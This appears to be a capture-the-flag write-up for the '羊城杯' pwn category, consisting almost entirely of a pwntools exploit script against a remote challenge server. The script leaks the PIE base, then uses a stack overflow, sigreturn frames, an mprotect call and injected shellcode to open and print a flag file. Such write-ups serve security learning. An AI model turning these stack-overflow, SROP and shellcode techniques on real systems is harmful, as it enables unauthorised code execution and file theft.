---
title: 羊城杯PWN WP
date: '2025-10-14 14:21:34'
updated: '2025-10-14 14:40:39'
---
## malloc
## stack
```python
from pwn import*
context(log_level="debug",arch="amd64")
#p=process("./pwn")
p=remote("45.40.247.139",17169)
#gdb.attach(p,"b *$rebase(0x157A)")
p.recvuntil("Good luck!")
payload=0x100*b'a'+p64(0)+b'\x5f'
p.send(payload)
p.recvuntil("magic number:")
num=int(p.recvline()[:-1].decode())

main=num//4
print(hex(main))
if str(hex(main))[-3:] =='6b0':
        piebase=main-0x16b0
        syscall=piebase+0x134f
        p.recvuntil("Good luck!")
        sigFrame=SigreturnFrame()
        sigFrame.rax=0
        sigFrame.rdi=0
        sigFrame.rsi=piebase+0x4060+0x500
        sigFrame.rdx=0x100
        sigFrame.rip=syscall
        sigFrame.rsp=piebase+0x4060+0x500-8
        pay2=0x100*b'a'+p64(0)+p64(syscall)+p64(0)+p64(syscall)+bytes(sigFrame)
        p.send(pay2)
        pay3=15*b'a'

        p.send(pay3)
        
        pay4=p64(0x161f+piebase)+p64(piebase+0x4570)+asm(f'''
                xor rdi,rdi
                mov rax,0x67616c662f
                push rax
                mov rsi,rsp
                xor rdx,rdx
                mov rax,257
                syscall
                mov rdi,3
                mov rsi,0
                mov rax,33
                syscall
                mov rdi,0
                mov rsi,{piebase}+0x4160
                mov rdx,0x50
                xor rax,rax
                syscall
                mov rdi,1
                mov rsi,{piebase}+0x4160
                mov rdx,0x50
                mov rax,1
                syscall
        ''')
        p.send(pay4)
        p.recvuntil("Good luck!")
        sigFrame.rax=10
        sigFrame.rdi=piebase+0x4000
        sigFrame.rsi=0x1000
        sigFrame.rdx=7
        sigFrame.rip=syscall
        sigFrame.rsp=piebase+0x4060+0x500
        pay5=0x100*b'a'+p64(0)+p64(syscall)+p64(0)+p64(syscall)+bytes(sigFrame)
        p.send(pay5)
        #gdb.attach(p)
        p.send(pay3)
        p.interactive()
else:
        p.close()

```

